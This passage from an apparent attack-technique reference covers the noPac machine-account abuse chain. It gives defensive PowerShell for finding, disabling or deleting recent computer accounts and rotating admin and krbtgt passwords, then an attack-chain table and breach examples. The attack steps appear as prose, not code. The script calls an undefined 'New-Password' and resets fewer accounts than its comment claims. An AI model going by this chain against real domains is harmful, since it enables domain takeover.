- LDAP modification packets with object creation/renaming

**Audit Logs:**
- AD audit entries showing computer object creation, password changes, name changes

---

### Response Procedures

**1. Identify Compromised Machine Accounts (0-15 minutes):**

**Command (PowerShell):**
```powershell
# Query for recently created computer accounts
Get-ADComputer -Filter {Created -gt (Get-Date).AddHours(-1)} | `
  Select-Object Name, Created, LastLogonDate, OperatingSystem | `
  Format-List

# Query for computer accounts with suspicious names (potential noPac attempts)
Get-ADComputer -Filter * | `
  Where-Object {$_.Name -like '*NOPAC*' -or $_.Name -like '*TEST*' -or $_.Name -like '*TEMP*'} | `
  Select-Object Name, Created, LastLogonDate

# Check for recent sAMAccountName changes
Get-EventLog -LogName Security -InstanceId 4781 -After (Get-Date).AddHours(-24) | `
  Where-Object {$_.Message -match 'Computer'} | `
  Select-Object TimeGenerated, Message
```

---

**2. Isolate Potentially Compromised Systems (5-10 minutes):**

```powershell
# Disable all recently created computer accounts
Get-ADComputer -Filter {Created -gt (Get-Date).AddHours(-1)} | `
  ForEach-Object {
    Disable-ADAccount -Identity $_.DistinguishedName
    Write-Host "Disabled: $($_.Name)"
  }

# Or remove entirely
Get-ADComputer -Filter {Created -gt (Get-Date).AddHours(-1)} | `
  ForEach-Object {
    Remove-ADComputer -Identity $_.DistinguishedName -Confirm:$false
    Write-Host "Removed: $($_.Name)"
  }
```

---

**3. Audit All AD Credentials for Compromise (30-60 minutes):**

```powershell
# If noPac was executed, assume all AD credentials are compromised
# Force password reset for all users and the krbtgt account

# Rotate all domain admin passwords
Get-ADGroupMember "Domain Admins" | `
  ForEach-Object {
    $newPassword = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 20 | % {[char]$_})
    Set-ADAccountPassword -Identity $_.DistinguishedName -NewPassword (ConvertTo-SecureString -AsPlainText $newPassword -Force) -Reset
    Write-Host "Password reset for: $($_.Name)"
  }

# Rotate krbtgt password twice (to invalidate Golden Tickets)
Set-ADUser -Identity krbtgt -PasswordNotRequired $false
Set-ADAccountPassword -Identity krbtgt -NewPassword (ConvertTo-SecureString -AsPlainText "$(New-Password)" -Force) -Reset

# After 15-30 minutes, reset krbtgt again to invalidate any tickets created with the first reset
# (this invalidates Golden Tickets created during the attack)
```

---

**4. Full Forest Remediation (If Confirmed Compromise):**

```powershell
# 1. Reset ms-DS-MachineAccountQuota to 0
# 2. Force password change for ALL users (pwdLastSet=0)
# 3. Rotate krbtgt password twice
# 4. Invalidate all Kerberos tickets
# 5. Review all admin group membership for unauthorized additions
# 6. Audit all DCSync operations for the past 30 days
# 7. Restore from clean backups if available
```

---

## Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView Enumeration | Attacker maps domain structure and identifies machine account quota |
| **2** | **Privilege Escalation** | **[PE-CREATE-001] ms-DS-MachineAccountQuota (THIS TECHNIQUE)** | **Creates machine account using default quota** |
| **3** | **Privilege Escalation** | [PE-TOKEN-006] SAMAccountName Spoofing (CVE-2021-42278) | Renames machine to impersonate DC |
| **4** | **Privilege Escalation** | [PE-TOKEN-005] Kerberos PAC Bypass (CVE-2021-42287) | Obtains DC-level Kerberos tickets via S4U2Self |
| **5** | **Credential Access** | [CA-DUMP-002] DCSync | Extracts all domain credentials using obtained privileges |
| **6** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Creates hidden admin accounts using dumped credentials |

---

## Real-World Examples

### Example 1: Widespread noPac Exploitation (Post-Disclosure 2021-2022)

- **Target:** Enterprise organizations globally (financial, government, healthcare)
- **Timeline:** November 2021 onwards (post-CVE disclosure)
- **Technique Status:** Active exploitation; used in multi-stage attacks
- **Attack Sequence:**
  1. Obtain any valid domain credentials (phishing, compromise, default creds)
  2. Execute noPac chain to escalate to Domain Admin
  3. Extract all AD credentials via DCSync
  4. Maintain persistence via Golden Tickets and backdoor accounts
  5. Lateral movement to critical systems
  6. Data exfiltration or ransomware deployment
- **Impact:** Complete forest compromise in < 60 seconds
- **Reference:** [Fortinet Analysis](https://www.fortinet.com/blog/threat-research/cve-2021-42278-cve-2021-42287-from-user-to-domain-admin-60-seconds), [Palo Alto Networks](https://www.paloaltonetworks.com/blog/security-operations/detecting-the-kerberos-nopac-vulnerabilities-with-cortex-xdr/)

---

### Example 2: AWS Managed Active Directory Exploitation

- **Target:** Organizations using AWS Managed Microsoft AD
- **Timeline:** 2023-2024
- **Technique Status:** noPac works identically in AWS Managed AD; ms-DS-MachineAccountQuota cannot be modified by users (AWS constraint)
- **Attack Impact:** Even more dangerous—organizations cannot reduce machine account quota, so must rely on other mitigations
- **Reference:** [Permiso Security Research](https://permiso.io/blog/abusing-default-machine-joining-to-domain-permissions-to-attack-aws-managed-active-directory)

---

### Example 3: Ransomware Group Lateral Movement

- **Target:** Large enterprises with unpatched noPac vulnerabilities
- **Timeline:** 2022-2024
- **Technique Status:** Used as one of multiple privilege escalation paths in ransomware attacks
- **Attack Sequence:**
  1. Initial compromise via RCE or phishing
  2. Execute noPac to escalate to Domain Admin
  3. Enumerate and compromise backup systems
  4. Deploy ransomware across entire enterprise
  5. Exfiltrate sensitive data for extortion
- **Impact:** Enterprise-wide outage; ransom demands in millions
- **Reference:** Various incident response reports

---

